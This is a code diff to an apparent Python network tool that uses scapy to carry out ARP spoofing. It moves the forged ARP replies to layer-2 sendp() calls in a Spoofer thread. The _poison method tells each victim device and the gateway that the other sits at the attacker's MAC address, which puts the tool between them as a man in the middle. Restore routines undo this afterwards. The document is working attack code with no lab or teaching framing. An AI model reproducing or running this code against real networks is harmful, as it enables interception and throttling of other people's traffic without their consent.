@@ -39,7 +39,7 @@ import time
 
 # Scapy is required for discovery + spoofing on every code path.
 from scapy.all import (
-    ARP, Ether, srp, send, conf, get_if_addr, get_if_hwaddr, getmacbyip,
+    ARP, Ether, srp, sendp, conf, get_if_addr, get_if_hwaddr, getmacbyip,
 )
 
 # pydivert (WinDivert) is only needed when we actually rate-limit. Import lazily
@@ -244,14 +244,21 @@ class Spoofer(threading.Thread):
         self.stop_event = threading.Event()
         self._lock = threading.Lock()
 
+    def _send_arp(self, dst_mac, **arp_fields):
+        """Send one ARP reply (op=2) at layer 2 with an explicit Ethernet dst.
+
+        Sending via sendp() with an Ether() layer — rather than L3 send() on a
+        bare ARP() — means scapy never has to resolve the destination MAC itself
+        (silencing the "is-at" warning) and `iface` actually takes effect."""
+        sendp(Ether(dst=dst_mac) / ARP(op=2, **arp_fields),
+              verbose=0, iface=conf.iface)
+
     def _poison(self):
         for ip, mac in list(self.targets.items()):   # snapshot: safe vs reload
             # Tell the victim that the gateway is at our MAC.
-            send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gw_ip, hwsrc=self.my_mac),
-                 verbose=0, iface=conf.iface)
+            self._send_arp(mac, pdst=ip, hwdst=mac, psrc=self.gw_ip, hwsrc=self.my_mac)
             # Tell the gateway that the victim is at our MAC.
-            send(ARP(op=2, pdst=self.gw_ip, hwdst=self.gw_mac, psrc=ip, hwsrc=self.my_mac),
-                 verbose=0, iface=conf.iface)
+            self._send_arp(self.gw_mac, pdst=self.gw_ip, hwdst=self.gw_mac, psrc=ip, hwsrc=self.my_mac)
 
     def run(self):
         while not self.stop_event.is_set():
@@ -271,20 +278,16 @@ class Spoofer(threading.Thread):
     def _heal(self, ip, mac, rounds=3):
         """Broadcast the true MAC mappings so this ip <-> gateway recover."""
         for _ in range(rounds):
-            send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gw_ip, hwsrc=self.gw_mac),
-                 verbose=0, iface=conf.iface)
-            send(ARP(op=2, pdst=self.gw_ip, hwdst=self.gw_mac, psrc=ip, hwsrc=mac),
-                 verbose=0, iface=conf.iface)
+            self._send_arp(mac, pdst=ip, hwdst=mac, psrc=self.gw_ip, hwsrc=self.gw_mac)
+            self._send_arp(self.gw_mac, pdst=self.gw_ip, hwdst=self.gw_mac, psrc=ip, hwsrc=mac)
             time.sleep(0.2)
 
     def restore(self, rounds=4):
         """Heal every current target's ARP cache on shutdown."""
         for _ in range(rounds):
             for ip, mac in list(self.targets.items()):
-                send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gw_ip, hwsrc=self.gw_mac),
-                     verbose=0, iface=conf.iface)
-                send(ARP(op=2, pdst=self.gw_ip, hwdst=self.gw_mac, psrc=ip, hwsrc=mac),
-                     verbose=0, iface=conf.iface)
+                self._send_arp(mac, pdst=ip, hwdst=mac, psrc=self.gw_ip, hwsrc=self.gw_mac)
+                self._send_arp(self.gw_mac, pdst=self.gw_ip, hwdst=self.gw_mac, psrc=ip, hwsrc=mac)
             time.sleep(0.3)
 
 
